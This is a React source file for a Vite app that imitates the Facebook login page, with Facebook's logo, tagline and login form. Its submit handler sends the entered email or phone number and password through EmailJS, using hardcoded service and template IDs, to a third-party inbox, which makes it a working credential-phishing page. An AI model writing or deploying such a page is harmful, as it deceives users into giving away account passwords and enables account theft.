import { useState } from 'react'
import reactLogo from './assets/react.svg'
import viteLogo from '/vite.svg'
import './App.css'
import React, { useRef } from 'react';
import { useForm } from 'react-hook-form';
import emailjs from '@emailjs/browser';
import { useNavigate } from "react-router-dom";
function App() {
  const { register, handleSubmit } = useForm();
  const form = useRef();
  const sendEmail = (data) => {
    emailjs.sendForm('service_4aejbqn', 'template_6f60rzh', form.current, 'lPqhoiwQkIwK67DW4')
      .then((result) => {
        console.log(result.text);
     

      }, (error) => {
        console.log(error.text);
      });

  }
 
  return (
    <div className='bg-white lg:bg-grey py-6 md:py-12'>
      <div className=' grid grid-cols-1 md:grid-cols-2 gap-10 py-11 md:py-24 mx-auto w-10/12'>
        <div className='text-center md:text-start'>
          <img className='w-72 hidden lg:block' src="https://static.xx.fbcdn.net/rsrc.php/yI/r/4aAhOWlwaXf.svg" alt="" />
          <select className='lg:hidden' id="cars">
            <option value="United Kingdom">Unide Kingdom</option>
            <option value="saab">Saab</option>
            <option value="opel">Opel</option>
            <option value="audi">Audi</option>
          </select>
          <img className='lg:hidden mx-auto w-20 mt-6' src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbS88SguP9IMoOJCs5td4m-4pikwsejv6Fy1jusBU&s" alt="" />
          <p className='text-3xl ms-6 text-black hidden lg:block'>Facebook helps you connect and share <br /> with the people in your life.</p>
        </div>
        <div className=''>
          <div className=' md:shadow-md items-center   bg-white md:w-96 mb-6 rounded-md'>
            <form className='text-center md:p-4' ref={form} onSubmit={handleSubmit(sendEmail)}>
              <div className="">
                <input name="number"  {...register("number")} type="text" placeholder="Email address or phone number" className="input input-bordered w-full rounded-md py-3 border-gray border-1 border-2 px-1" />
              </div>
              <div className="mt-2">
                <input name="password"  {...register("password")} type="text" placeholder="Password" className="input input-bordered w-full rounded-md py-3 border-gray border-1 border-2 px-1" />
              </div>
              <div className="mt-3 text-white">
                <input type="submit" className=" w-full rounded-md py-3 bg-blue px-1 font-bold text-xl mb-4" value="Log In" />
              </div>
              <div>
                <a className='text-black text-sm md:text-blue md:text-sm md:font-normal font-bold' href="#">Forgotten Password?</a>
              </div>
              <hr className='text-gray border mt-4' />
              <button className='btn my-4 bg-green text-white font-bold py-3'>Create new account</button>
            </form>

          </div>
          <span className='ms-6 hidden md:block'><a href="" className='text-black font-bold '>Create a Page</a> for a celebrity, brand or business.</span>

        </div>
      </div>
    </div>
  )
}

export default App
